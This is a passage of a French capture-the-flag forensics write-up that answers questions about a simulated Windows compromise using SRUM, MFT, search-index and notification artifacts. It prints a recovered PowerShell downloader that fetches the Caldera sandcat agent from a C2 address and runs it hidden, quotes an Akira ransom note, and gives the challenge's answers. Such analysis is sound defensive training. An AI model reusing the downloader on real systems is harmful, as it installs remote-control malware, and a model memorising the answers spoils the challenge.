J'ai donc commencé à réfléchir à d'autres endroits où les informations de téléchargement pourraient être stockées, en dehors du navigateur lui-même.

Après quelques recherches, j'ai trouvé `CryptnetUrlCache`. Il s'agit d'un cache utilisé par Windows/CertUtil pour stocker les fichiers téléchargés avec certutil.

J'ai trouvé [cet article](https://www.pcreview.co.uk/threads/cryptneturlcache-what-is-it.3873492/).

Vous trouverez cet artefact à l'emplacement suivant :

```
C:\Users\bello\AppData\LocalLow\Microsoft\CryptnetUrlCache\
```

Ensuite, j'ai réfléchi à la manière d'analyser cet artefact. Après quelques recherches, j'ai trouvé un outil appelé [CryptnetURLCacheParser](https://github.com/AbdulRhmanAlfaifi/CryptnetURLCacheParser).

Il est conçu pour analyser les fichiers CryptnetUrlCache et en extraire les informations. Les données se trouvent dans le dossier `MetaData`.

J'ai ensuite utilisé l'outil :

```bash
python CryptnetUrlCacheParser.py -d ./MetaData
```

Dans la sortie, on a eu ceci :

```
"2026-07-24T02:51:40.280164","1601-01-01T00:00:00","https://get.helpwire.app/downloads/operator/windows/HelpWire",452566,"","./MetaData/05570DA41288291E7D9E180B3AA48DF0"
```

Donc, la réponse est : `HelpWire_2026-07-24 02:51:40`

### Q11 : Combien d'octets de données le fichier binaire malveillant a-t-il envoyés au total au serveur C2 ?

Comme nous ne disposons pas d'un fichier PCAP dans le défi, le meilleur endroit pour rechercher des informations sur l'utilisation du réseau est l'artefact SRUM.

Cet artefact contient des informations sur la façon dont les applications utilisent le réseau, notamment la quantité de données envoyées et reçues.

Vous pouvez le trouver à l'adresse suivante :

```
C:\Windows\System32\SRU\
```

Nous pouvons ensuite l'analyser avec SrumECmd d'Eric Zimmerman, avec la commande suivante :

```bash
wine SrumECmd.exe -f ~/leak/Export/SRUDB.dat -r ~/leak/Export/SOFTWARE --csv ~/leak/Export
```

Mais la commande ne fonctionnait malheureusement pas chez moi. J'ai donc dû chercher autre chose. Je suis tombé sur [srumparser.com](https://www.srumparser.com/en), qui parse très bien les données SRUM avec des détails propres et tout catégorisé. Nous avons la catégorie Network Data Usage. En effectuant une recherche sur `FTK_Imager.exe`, on constate qu'il apparaît deux fois dans les enregistrements d'utilisation du réseau, avec les quantités de données envoyées suivantes :

- 94 191 octets
- 45 253 octets

En additionnant les deux valeurs :

```
94 191 + 45 253 = 139 444 octets
```

La quantité totale de données envoyées par le logiciel malveillant au serveur C2 était donc de :

```
139444
```

### Q12 : Quelle est la durée totale d'exécution du logiciel malveillant en ms (millisecondes) ?

Je suis reparti sur l'autre site pour avoir l'info, mais la réponse n'y figure pas. J'ai donc cherché un autre outil pour parser le SRUM, et je suis tombé sur [srum-dump](https://github.com/MarkBaggett/srum-dump/releases). Avec `wine srum_dump.exe`, il parse parfaitement et fournit un fichier CSV que j'ai envoyé sur Timeline Explorer d'Eric.

Dans la feuille `AppTimelineProvider`, on constate qu'elle contient des informations sur l'utilisation des applications, notamment `DurationMs`, qui représente la durée d'exécution de l'application en millisecondes. En recherchant `FTK_Imager.exe`, on constate qu'il apparaît trois fois, avec une valeur `DurationMs` différente pour chaque entrée.

Les valeurs sont :

- 599997
- 1139991
- 300002

En additionnant les trois valeurs de `DurationMs` :

```
599997 + 1139991 + 300002 = 2039990
```

La durée totale d'exécution du logiciel malveillant était donc de :

```
2039990
```

### Q13 : Le TA a déposé un script malveillant pour l'exfiltration de données. Quel est le nom du fichier script et quelle est l'adresse IP vers laquelle les données étaient exfiltrées ?

En cherchant dans `ConsoleHost_history.txt`, j'ai trouvé plusieurs commandes PowerShell, et l'une d'elles contenait l'adresse IP `192.168.1.137`. J'ai donc supposé que c'était la réponse. Cependant, lorsque je l'ai soumise, le défi l'a marquée comme incorrecte et a affiché un indice indiquant que l'adresse IP requise n'était pas nécessairement la même que celle de la phase d'exécution.

J'ai alors pensé au fichier `up.ps1`, qui devait se trouver dans :

```
C:\Users\Public\Downloads
```

Cependant, le fichier n'était plus là, j'ai donc décidé d'essayer la récupération de fichiers.

J'ai d'abord examiné le fichier `$MFT` avec [MFTExplorer](https://ayinedjimi-consultants.fr/articles/ntfs-forensics-advanced) d'Eric. L'outil graphique plantait chez moi, donc je suis passé par MFTECmd :

```bash
MFTECmd.exe -f "$MFT" --csv
```

Cela a produit un fichier CSV assez lourd que j'ai ouvert dans Timeline Explorer. J'ai recherché `up_ps1` et je suis tombé sur l'entrée concernée.

J'ai relevé le numéro d'entrée, `330346`, et le numéro de séquence, `1`, pour le fichier `up.ps1`.

J'ai ensuite utilisé la commande suivante pour afficher les détails de l'entrée MFT :

```bash
MFTECmd.exe -f "$MFT" --de 330346-1
```

Et là, nous avons obtenu :

```powershell
$server = "http://106.107.1.148:8888" ;
$url = "$server/file/download" ;
$wc = New-Object System.Net.WebClient;
$wc.Headers.add("platform", "windows");
$wc.Headers.add("architecture", "amd64");
$wc.Headers.add("file", "sandcat.go");
$data = $wc.DownloadData($url);
get-process | ? { $_.modules.filename -like "C:\Users\Public\FTK_Imager.exe" } | stop-process -f;
rm -force "C:\Users\Public\FTK_Imager.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\FTK_Imager.exe", $data) | Out-Null;
Start-Process -FilePath C:\Users\Public\FTK_Imager.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
```

On voit l'adresse IP `106.107.1.148`, qui est le serveur C2 auquel le script se connecte pour télécharger et exécuter `sandcat.go`.

La réponse est donc :

```
up.ps1_106.107.1.148
```

### Q14 : Quel est l'horodatage d'exécution/de lancement du script d'exfiltration identifié dans la question précédente ?

Je suis retourné à la sortie MFT et j'ai vérifié le `Last Access`, car il indique la date et l'heure du dernier accès au fichier.

J'ai constaté que le fichier `up.ps1` avait été consulté pour la dernière fois (Last Access) à `2026-07-24 03:16:02`.

### Q15 : La procédure de récupération est documentée dans un document RTF. Quel est le nom de famille de l'auteur du document et quelle est sa première recommandation pour la récupération ?

Pour cette question, j'ai décidé d'essayer une méthode différente pour récupérer le fichier, en utilisant la base de données d'index de recherche Windows (`Windows.edb`), que l'on peut trouver à l'emplacement suivant :

```
C:\ProgramData\Microsoft\Search\Data\Applications\Windows
```

Ce fichier `Windows.edb` est la base de données d'index de recherche Windows. Il stocke les informations indexées sur les fichiers du système, notamment les métadonnées et une partie du contenu des fichiers.

De ce fait, il peut être utile pour retrouver des traces de fichiers qui ne se trouvent plus à leur emplacement d'origine.

J'ai décidé d'utiliser [Search Index DB Reporter (SIDR)](https://github.com/strozfriedberg/sidr/releases/tag/v0.9.2) pour analyser la base de données. Il s'agit d'un outil conçu pour analyser les artefacts de recherche Windows. Je rencontrais des problèmes pour le lancer avec wine, donc voici finalement la commande qui a fonctionné :

```bash
mkdir -p ~/.wine/drive_c/sidr_work/output
cp ~/leak/Export/Windows.edb ~/leak/Export/sidr.exe ~/.wine/drive_c/sidr_work/
cd ~/.wine/drive_c/sidr_work
wine sidr.exe -f csv -o C:\\sidr_work\\output C:\\sidr_work
```

J'ai ouvert les CSV produits dans Timeline Explorer, j'ai recherché `fichier` et `.rtf`, et je suis tombé sur `recovery_procedure.rtf`, qui contient les éléments suivants :

```
by: __ Brahim Zakrout __
role: GRC __
how to recover: take a deep breath.
how to recover: take a deep breath.
how to recover: take a deep breath.
...
```

On constate que l'auteur du document est Brahim Zakrout. Ensuite, la première étape de récupération apparaît :

```
take a deep breath
```

Voici la réponse :

```
Zakrout_take a deep breath.
```

### Q16 : En ce qui concerne l'anti-forensique, quand le TA a-t-il effacé les journaux d'événements ?

En consultant précédemment les journaux de sécurité, je les ai trouvés à l'emplacement suivant :

```
C:\Windows\System32\winevt\Logs\Security.evtx
```

J'ai parsé le fichier avec EvtxCmd d'Eric et envoyé le CSV dans Timeline Explorer. Comme on sait que les journaux ont été supprimés, j'ai cherché le mot `Cleared` et je suis tombé sur cette entrée :

```json
{"UserData":{"LogFileCleared":{"SubjectUserSid":"S-1-5-21-1256453946-4022582877-3363549628-1001","SubjectUserName":"bello","SubjectDomainName":"DESKTOP-0G20ROC","SubjectLogonId":"0x578CD","ClientProcessId":"3916","ClientProcessStartKey":"5348024557504040"}}}
```

La date de l'effacement est donc : `2026-07-24 03:35:10 AM`

### Q17 : Outre l'exfiltration de données, le TA a déployé un ransomware à la fin. Quelle est la nouvelle extension des fichiers chiffrés ?

En vérifiant les résultats du générateur de rapports de base de données d'index de recherche (SIDR) que nous avons utilisé précédemment sur `Windows.edb`, j'ai trouvé un fichier nommé `akira_readme.txt`, situé à :

```
C:\Utilisateurs\bello\Bureau\akira_readme.txt
```

Et son contenu était :

> Peu importe qui vous êtes et votre fonction, si vous lisez ceci, cela signifie que l'infrastructure interne de votre entreprise est totalement ou partiellement hors service, et que toutes vos sauvegardes (virtuelles et physiques, tout ce que nous avons pu atteindre) ont été complètement supprimées. De plus, nous avons dérobé une grande quantité de vos données d'entreprise avant leur chiffrement. Pour l'instant, gardons nos regrets et notre ressentiment pour nous et essayons d'instaurer un dialogue constructif. Nous sommes pleinement conscients des dommages causés par le blocage de vos ressources internes. À l'heure actuelle, vous devez savoir que :
> 1. En traitant avec nous, vous réaliserez d'importantes économies, car notre objectif n'est pas de vous ruiner. Nous étudierons en détail votre situation financière, vos relevés bancaires, votre épargne, vos investissements, etc., et vous présenterons une offre raisonnable. Si vous disposez d'une assurance cyber en vigueur, veuillez nous en informer afin que nous vous expliquions comment l'utiliser au mieux. Par ailleurs, prolonger les négociations risque de compromettre la conclusion de l'accord.
> 2. En nous payant, vous économisez votre TEMPS, votre ARGENT, vos EFFORTS et bien plus encore.

Son nom indique clairement qu'il s'agit d'un ransomware, et plus précisément du ransomware Akira. `akira_readme.txt` est un fichier README généralement déposé après le chiffrement pour informer la victime de l'attaque.

Il est bien connu que le ransomware Akira utilise l'extension `.akira` pour les fichiers chiffrés. La réponse est donc : `.akira`

### Q18 : Peu après l'attaque, la victime a reçu un message d'un collègue l'avertissant que son ordinateur était compromis. Quel est le nom de ce collègue ?

Pour cette question, je me suis souvenu d'en avoir résolu une similaire lors d'un défi précédent, où il fallait retrouver un message via Discord. Cette fois, il s'agissait de Telegram, ce que j'ai déduit en examinant les éléments du document.

Il existe deux façons de retrouver le contenu du message.

Premièrement, l'utilisateur a utilisé Telegram Web, et en consultant l'historique Chrome, nous avons trouvé des traces indiquant que Telegram Web a été utilisé.

On pourrait tenter de retrouver le contenu du message dans le cache Chrome du profil, et utiliser CCL Chromium Reader pour dumper ce cache. J'ai cependant écarté cette méthode, car après avoir parcouru le chemin, je n'ai pas trouvé le cache recherché.

L'autre solution, plus appropriée ici, consiste à consulter les notifications Windows. Ce système stocke et gère les notifications affichées à l'utilisateur par les différentes applications ; il peut donc contenir les messages qui sont apparus sous forme de notifications.

Le fichier de base de données des notifications est `wpndatabase.db`, et se trouve généralement à l'emplacement suivant :

```
C:\Utilisateurs\bello\AppData\Local\Microsoft\Windows\Notifications\
```

J'ai téléchargé le fichier et je suis allé sur [SQLite Viewer](https://inloop.github.io/sqlite-viewer/) pour le visualiser.

```xml
<toast launch="0|0|Default|Chrome|0|https://web.telegram.org/|p#https://web.telegram.org/#10" displayTimestamp="2026-07-24T22:14:16Z">
 <visual>
  <binding template="ToastGeneric">
   <text>houari</text>
   <text>ur under attack boy!</text>
   <text placement="attribution">web.telegram.org</text>
   <image placement="appLogoOverride" src="C:\Users\bello\AppData\Local\Google\Chrome\User Data\Notification Resources\bf0577a4-e7bf-4472-a562-fa244620a466.tmp" hint-crop="none"/>
  </binding>
 </visual>
 <actions>
  <action content="Go to Chrome notification settings" placement="contextMenu" activationType="foreground" arguments="2|0|Default|Chrome|0|https://web.telegram.org/|p#https://web.telegram.org/#10"/>
 </actions>
</toast>
```

Donc le nom du collègue, c'est bien `houari`.

### Q19 : Quel est le rôle de l'employé au sein de l'entreprise et quel est son numéro de badge ?

Au départ, j'avais trouvé une image nommée `badge.png` dans `C:\Users\bello\Pictures`. Malheureusement, l'image originale n'était pas disponible, j'ai donc décidé d'essayer de la récupérer, en pensant qu'elle pourrait contenir la réponse à la question.

J'ai pensé utiliser les enregistrements MFT et `Windows.edb` pour la récupérer, mais je n'y suis pas parvenu. C'était la seule solution à laquelle j'avais pensé à ce moment-là.

J'ai cependant négligé l'un des artefacts les plus importants : le ThumbCache. J'ai d'abord vérifié si la photo avait bien été ouverte, grâce au Prefetch, et c'était bien le cas :

```bash
python ~/Projets/CTF-Arsenal/notes/forensics/tools/pfparse.py PHOTOS.EXE-016B0924.pf
```

J'ai téléchargé les thumbcache avec Autopsy et utilisé `wine ~/tools/thumbcache_viewer.exe` pour les visualiser.

On y trouve de nombreuses images et vignettes, dont celle que nous recherchions : `badge.png`. Cependant, l'image porte un nom différent dans le ThumbCache, car l'outil nomme les fichiers extraits à l'aide d'un hachage au lieu du nom d'origine.

Après avoir parcouru les fichiers extraits, j'ai constaté que l'image recherchée était :

```
92b1478b35b8d6a5.jpg
```

L'image contient les informations suivantes :

- Nom : Bello
- Numéro d'identification / de badge : 0x0137
- Rôle : Stupid

La réponse est donc : `Stupide_0x0137`

### Q20 : D'après les IOC, quel framework fait office de C2 sur cet incident ?

Cette question ne nécessite pas l'analyse de nouveaux artefacts. Nous avons précédemment trouvé le fichier `up.ps1`, qui contient des commandes PowerShell liées au serveur C2 :

```powershell
$url = "$server/file/download";
$wc = New-Object System.Net.WebClient;
$wc.Headers.add("platform", "windows");
$wc.Headers.add("architecture", "amd64");
$wc.Headers.add("file", "sandcat.go");
```

En analysant le fichier, on constate que le script définit l'adresse du serveur :

```powershell
$server = "http://106.107.1.148:8888";
```

Il se connecte ensuite au point de terminaison suivant :

```
/file/download
```

Il utilise plusieurs en-têtes HTTP pour spécifier le système d'exploitation, l'architecture et le fichier à télécharger :

```powershell
$wc.Headers.add("platform", "windows");
$wc.Headers.add("architecture", "amd64");
$wc.Headers.add("file", "sandcat.go");
```

Le fichier est ensuite téléchargé avec :

```powershell
$data = $wc.DownloadData($url);
```

Le point le plus important ici est `sandcat.go`.

Sandcat est l'agent utilisé par MITRE Caldera. Sa présence aux côtés du point de terminaison C2 `/file/download` constitue donc un indice de compromission fort, qui indique l'utilisation de Caldera comme plateforme C2.

Pour plus d'informations, vous pouvez consulter [cet article](https://caldera.readthedocs.io/en/3.1.0/Plugin-library.html).

Après avoir téléchargé l'agent, le script l'écrit dans :

```
C:\Utilisateurs\Public\FTK_Imager.exe
```

Il l'exécute ensuite avec :

```
-server $server
```

Cela signifie que l'agent se connecte au serveur spécifié au début du script.

Ainsi, en analysant les IOC trouvés dans `up.ps1`, nous avons pu identifier le framework C2 utilisé lors de l'incident.

Réponse :

```
Caldera
```